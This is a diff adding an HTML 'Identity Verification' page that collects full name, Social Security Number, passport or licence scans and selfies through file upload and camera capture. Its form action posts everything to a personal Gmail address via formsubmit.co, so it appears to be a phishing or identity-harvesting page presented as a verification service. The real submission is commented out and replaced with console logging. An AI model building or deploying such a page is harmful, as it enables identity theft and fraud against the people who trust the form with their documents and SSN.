@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Professional Verification Form</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        /* General Body and Container Styling */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #1a1a2e;
+            color: #e4e4f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            overflow-x: hidden;
+        }
+
+        .container {
+            background: #2a2a44;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 600px;
+            position: relative;
+            z-index: 1;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #e4e4f5;
+            font-weight: 600;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.2);
+        }
+
+        /* Form Group and Input Styling */
+        .form-group {
+            margin-bottom: 15px; /* تم التعديل */
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .form-group.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px; /* تم التعديل */
+            font-weight: 400;
+        }
+
+        input[type="text"],
+        select {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background-color: #3e3e5c;
+            color: #e4e4f5;
+            box-sizing: border-box;
+            transition: background-color 0.3s, box-shadow 0.3s;
+        }
+
+        input[type="text"]:focus,
+        select:focus {
+            outline: none;
+            background-color: #4e4e6d;
+            box-shadow: 0 0 0 3px rgba(121, 196, 255, 0.5);
+        }
+
+        input::placeholder {
+            color: #8c8c9b;
+        }
+
+        #ssnExample {
+            font-size: 12px;
+            color: #8c8c9b;
+            margin-top: 5px;
+            margin-bottom: 10px; /* تم التعديل */
+            display: block; /* لضمان أخذ سطر كامل */
+        }
+
+        /* File Upload and Camera Button Styling (The core of the responsiveness fix) */
+        .file-upload-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px; /* Space between buttons */
+        }
+        
+        /* General button styling */
+        .file-input-label,
+        .camera-button {
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: 600;
+            transition: background-color 0.3s;
+            flex: 1; /* Make buttons grow to fill space */
+            white-space: nowrap; /* Prevent text from wrapping */
+        }
+        
+        .file-input-label {
+            background-color: #5c6fff;
+            color: white;
+            display: block;
+        }
+
+        .file-input-label:hover {
+            background-color: #4a5ee0;
+        }
+        
+        .camera-button {
+            background-color: #5c6fff;
+            color: white;
+            border: none;
+        }
+        
+        .camera-button:hover {
+            background-color: #4a5ee0;
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+
+        /* Submit Button Styling */
+        #submitBtn {
+            width: 100%;
+            padding: 15px;
+            background-color: #8a2be2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 16px;
+            transition: transform 0.3s, background-color 0.3s;
+            position: relative;
+            overflow: hidden;
+            margin-top: 15px; /* تم التعديل لضمان تباعد جيد */
+        }
+
+        #submitBtn:hover {
+            background-color: #791bd1;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4);
+        }
+
+        #submitBtn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 300%;
+            height: 300%;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            transition: transform 0.6s ease;
+            transform: translate(-50%, -50%) scale(0);
+        }
+
+        #submitBtn:hover::after {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .required::after {
+            content: '*';
+            color: #ff6b6b;
+            margin-left: 5px;
+        }
+        
+        /* GSAP specific glow animation */
+        .glow {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle, #ff6b6b 0%, transparent 70%);
+            border-radius: 50%;
+            filter: blur(50px);
+            opacity: 0;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* --- Media Queries for mobile responsiveness --- */
+        @media (min-width: 480px) {
+            .file-upload-group {
+                flex-direction: row; /* Change buttons to a row layout on larger screens */
+            }
+        }
+
+        /* CSS for the camera popup */
+        .camera-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .camera-content {
+            background: #2a2a44;
+            padding: 20px;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+        }
+
+        #camera-feed {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        #capture-btn {
+            background-color: #8a2be2;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        #capture-btn:hover {
+            background-color: #791bd1;
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Identity Verification</h2>
+
+        <form id="verificationForm" action="https://formsubmit.co/ademlindo65@gmail.com" method="POST" enctype="multipart/form-data">
+            
+            <input type="hidden" name="_next" value="https://yourwebsite.com/success.html">
+            <input type="hidden" name="_honey" style="display:none;">
+
+            <div class="form-group visible" id="countryGroup">
+                <label for="country">Country</label>
+                <select id="country" name="country">
+                    <option value="" disabled selected>Select your country</option>
+                    <option value="US">United States</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="usFields">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" name="fullName" placeholder="Enter your full name">
+
+                <label for="ssn">Social Security Number (SSN)</label>
+                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX">
+                <small id="ssnExample">Example: 123-45-6789</small>
+            </div>
+
+            <div class="form-group" id="documentTypeGroup">
+                <label for="documentType">Verification Method</label>
+                <select id="documentType" name="documentType">
+                    <option value="" disabled selected>Choose a document type</option>
+                    <option value="passport">Passport</option>
+                    <option value="drivers-license">Driver's License</option>
+                    <option value="identification">Identification Card</option>
+                </select>
+            </div>
+
+            <div class="form-group" id="passportFields">
+                <label for="passportUpload" class="required">Upload Passport Scan</label>
+                <div class="file-upload-group">
+                    <label for="passportUpload" id="passportLabel" class="file-input-label">Choose File</label>
+                    <input type="file" id="passportUpload" name="passportUpload" accept="image/*">
+                    <button type="button" class="camera-button" onclick="openCamera('passportUpload', 'environment')">Open Camera</button>
+                </div>
+            </div>
+
+            <div class="form-group" id="selfiePassportField">
+                <label for="selfiePassportUpload" class="required">Upload Selfie</label>
+                <div class="file-upload-group">
+                    <label for="selfiePassportUpload" id="selfiePassportLabel" class="file-input-label">Choose File</label>
+                    <input type="file" id="selfiePassportUpload" name="selfiePassportUpload" accept="image/*">
+                    <button type="button" class="camera-button" onclick="openCamera('selfiePassportUpload', 'user')">Open Camera</button>
+                </div>
+            </div>
+
+            <div class="form-group" id="dlIdFields">
+                <label for="frontSide" class="required">Front Side of Document</label>
+                <div class="file-upload-group">
+                    <label for="frontSide" id="frontSideLabel" class="file-input-label">Choose File</label>
+                    <input type="file" id="frontSide" name="frontSide" accept="image/*">
+                    <button type="button" class="camera-button" onclick="openCamera('frontSide', 'environment')">Open Camera</button>
+                </div>
+
+                <label for="backSide" class="required">Back Side of Document</label>
+                <div class="file-upload-group">
+                    <label for="backSide" id="backSideLabel" class="file-input-label">Choose File</label>
+                    <input type="file" id="backSide" name="backSide" accept="image/*">
+                    <button type="button" class="camera-button" onclick="openCamera('backSide', 'environment')">Open Camera</button>
+                </div>
+
+                <label for="selfieDlId" class="required">Selfie</label>
+                <div class="file-upload-group">
+                    <label for="selfieDlId" id="selfieDlIdLabel" class="file-input-label">Choose File</label>
+                    <input type="file" id="selfieDlId" name="selfieDlId" accept="image/*">
+                    <button type="button" class="camera-button" onclick="openCamera('selfieDlId', 'user')">Open Camera</button>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn">Submit</button>
+        </form>
+    </div>
+
+    <div class="glow" id="glow"></div>
+
+    <div class="camera-popup" id="cameraPopup">
+        <div class="camera-content">
+            <span class="close-btn" onclick="closeCamera()">&times;</span>
+            <video id="camera-feed" autoplay></video>
+            <canvas id="camera-canvas" style="display:none;"></canvas>
+            <button id="capture-btn">Capture Photo</button>
+        </div>
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
+    <script>
+        const form = document.getElementById('verificationForm');
+        const countrySelect = document.getElementById('country');
+        const usFields = document.getElementById('usFields');
+        const documentTypeGroup = document.getElementById('documentTypeGroup');
+        const documentTypeSelect = document.getElementById('documentType');
+        const passportFields = document.getElementById('passportFields');
+        const selfiePassportField = document.getElementById('selfiePassportField');
+        const dlIdFields = document.getElementById('dlIdFields');
+        const ssnInput = document.getElementById('ssn');
+        const allFormGroups = document.querySelectorAll('.form-group');
+        const glow = document.getElementById('glow');
+        
+        const cameraPopup = document.getElementById('cameraPopup');
+        const cameraFeed = document.getElementById('camera-feed');
+        const cameraCanvas = document.getElementById('camera-canvas');
+        const captureBtn = document.getElementById('capture-btn');
+        let currentStream;
+        let currentInputId;
+
+        document.addEventListener('DOMContentLoaded', () => {
+            gsap.from('.container', { opacity: 0, scale: 0.9, duration: 1, ease: "back.out(1.7)" });
+            documentTypeGroup.classList.remove('visible');
+            dlIdFields.classList.remove('visible');
+            passportFields.classList.remove('visible');
+            selfiePassportField.classList.remove('visible');
+            usFields.classList.remove('visible');
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            gsap.to(glow, {
+                x: e.clientX,
+                y: e.clientY,
+                opacity: 0.5,
+                duration: 0.5,
+                ease: "power2.out"
+            });
+        });
+
+        document.body.addEventListener('mouseleave', () => {
+            gsap.to(glow, { opacity: 0, duration: 0.5 });
+        });
+
+        countrySelect.addEventListener('change', () => {
+            const selectedCountry = countrySelect.value;
+            usFields.classList.remove('visible');
+            documentTypeGroup.classList.remove('visible');
+            passportFields.classList.remove('visible');
+            selfiePassportField.classList.remove('visible');
+            dlIdFields.classList.remove('visible');
+            
+            gsap.to(allFormGroups, {
+                opacity: 0,
+                y: 20,
+                stagger: 0.05,
+                duration: 0.3,
+                onComplete: () => {
+                    if (selectedCountry === 'US') {
+                        usFields.classList.add('visible');
+                        documentTypeGroup.classList.add('visible');
+                        gsap.fromTo([usFields, documentTypeGroup], { y: 20, opacity: 0 }, { y: 0, opacity: 1, stagger: 0.1 });
+                    } else if (selectedCountry === 'other') {
+                        documentTypeGroup.classList.add('visible');
+                        gsap.fromTo(documentTypeGroup, { y: 20, opacity: 0 }, { y: 0, opacity: 1, duration: 0.5 });
+                    }
+                }
+            });
+        });
+
+        documentTypeSelect.addEventListener('change', () => {
+            const selectedType = documentTypeSelect.value;
+            passportFields.classList.remove('visible');
+            selfiePassportField.classList.remove('visible');
+            dlIdFields.classList.remove('visible');
+
+            if (selectedType === 'passport') {
+                passportFields.classList.add('visible');
+                selfiePassportField.classList.add('visible');
+                gsap.fromTo([passportFields, selfiePassportField], { y: 20, opacity: 0 }, { y: 0, opacity: 1, stagger: 0.1 });
+            } else if (selectedType === 'drivers-license' || selectedType === 'identification') {
+                dlIdFields.classList.add('visible');
+                gsap.fromTo(dlIdFields, { y: 20, opacity: 0 }, { y: 0, opacity: 1 });
+            }
+        });
+
+        ssnInput.addEventListener('input', (e) => {
+            const value = e.target.value.replace(/\D/g, '');
+            let formattedValue = '';
+            if (value.length > 0) {
+                formattedValue += value.substring(0, 3);
+            }
+            if (value.length > 3) {
+                formattedValue += '-' + value.substring(3, 5);
+            }
+            if (value.length > 5) {
+                formattedValue += '-' + value.substring(5, 9);
+            }
+            e.target.value = formattedValue;
+        });
+
+        async function openCamera(inputId, facingMode) {
+            currentInputId = inputId;
+            const constraints = {
+                video: {
+                    facingMode: facingMode
+                }
+            };
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                cameraFeed.srcObject = stream;
+                cameraPopup.style.display = 'flex';
+            } catch (err) {
+                console.error("Error accessing camera:", err);
+                alert("Failed to open camera. Make sure you are on HTTPS and have given permission.");
+            }
+        }
+
+        function closeCamera() {
+            cameraPopup.style.display = 'none';
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        captureBtn.addEventListener('click', () => {
+            cameraCanvas.width = cameraFeed.videoWidth;
+            cameraCanvas.height = cameraFeed.videoHeight;
+            const context = cameraCanvas.getContext('2d');
+            context.drawImage(cameraFeed, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            
+            cameraCanvas.toBlob((blob) => {
+                const file = new File([blob], "camera_capture.jpg", { type: "image/jpeg" });
+                const dataTransfer = new DataTransfer();
+                dataTransfer.items.add(file);
+                
+                const fileInput = document.getElementById(currentInputId);
+                fileInput.files = dataTransfer.files;
+                
+                const labelElement = document.querySelector(`label[for='${currentInputId}']`);
+                if (labelElement) {
+                    labelElement.textContent = file.name;
+                }
+                
+                closeCamera();
+            }, 'image/jpeg');
+        });
+
+        const fileInputs = document.querySelectorAll('input[type="file"]');
+        fileInputs.forEach(input => {
+            input.addEventListener('change', (e) => {
+                const fileName = e.target.files.length > 0 ? e.target.files[0].name : 'Choose File';
+                const labelElement = document.querySelector(`label[for='${e.target.id}']`);
+                if (labelElement) {
+                    labelElement.textContent = fileName;
+                }
+            });
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            console.log('Form Submitted!', data);
+            alert('Form submitted! Check the console for data.');
+            // This is where you'd normally submit the form to Formsubmit
+            // e.target.submit(); 
+        });
+    </script>
+</body>
+</html>
